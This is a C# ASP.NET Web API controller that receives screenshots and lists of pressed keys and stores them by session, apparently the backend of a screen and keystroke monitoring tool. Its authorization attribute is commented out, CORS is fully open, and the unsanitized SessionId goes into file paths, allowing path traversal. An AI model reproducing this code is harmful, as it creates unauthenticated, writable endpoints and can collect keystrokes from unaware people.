using System;
using System.IO;
using System.Web;
using System.Web.Http;
using System.Web.Http.Cors;
using HIT.Common.Utils;
using HIT.Web.Infrastructure.Extensions;
using HIT.Web.ViewModels;

namespace HIT.Web.Controllers
{
    //[Authorize(Roles = "Admin")]
    [RoutePrefix("api/Sessions")]
    [EnableCors(origins: "*", headers: "*", methods: "*")]
    public class SessionsController : ApiController
    {
        private readonly string BasePath =
            HttpContext.Current.Server.MapPath("~/App_Data/");

        [HttpPost]
        [Route("PostSnapshot")]
        public IHttpActionResult PostSnapshot(SnapshotViewModel model)
        {
            var currentDate = DateTime.Now;
            var year = currentDate.Year;
            var month = currentDate.ToString("MMMM");
            var mm = currentDate.ToString("MMM");
            var day = currentDate.Day;

            var timeOfDay = currentDate.TimeOfDay;
            var hours = timeOfDay.Hours.ToTimeString();
            var minutes = timeOfDay.Minutes.ToTimeString();
            var seconds = timeOfDay.Seconds.ToTimeString();

            var image = ConvertionOperations.ImageFromByteArray(model.SnapshotAsByteArray);
            var fileName = $"{year}-{month}-{day}-{hours}-{minutes}-{seconds}.jpeg";
            var filePath = $@"{this.BasePath}Sessions\{model.SessionId}";
            var fullFilePath = $@"{filePath}\{fileName}";

            this.CreateDirectory(filePath);

            image.Save(fullFilePath);

            return this.Ok();
        }

        [HttpPost]
        [Route("PostKeysPressed")]
        public IHttpActionResult PostKeysPressed(KeysPressedViewModel model)
        {
            var filePath = $@"{this.BasePath}\Sessions\{model.SessionId}";
            var fullFilePath = $@"{filePath}\KeysPressed.txt";
            var appendData = true;

            this.CreateDirectory(filePath);

            using (StreamWriter writer = new StreamWriter(fullFilePath, appendData))
            {
                for (int i = 0; i < model.KeysPressedList.Count; i++)
                {
                    writer.WriteLine(model.KeysPressedList[i]);
                }

                writer.Flush();
            }

            return this.Ok();
        }

        [NonAction]
        private void CreateDirectory(string directoryPath)
        {
            if (!Directory.Exists(directoryPath))
            {
                Directory.CreateDirectory(directoryPath);
            }
        }
    }
}
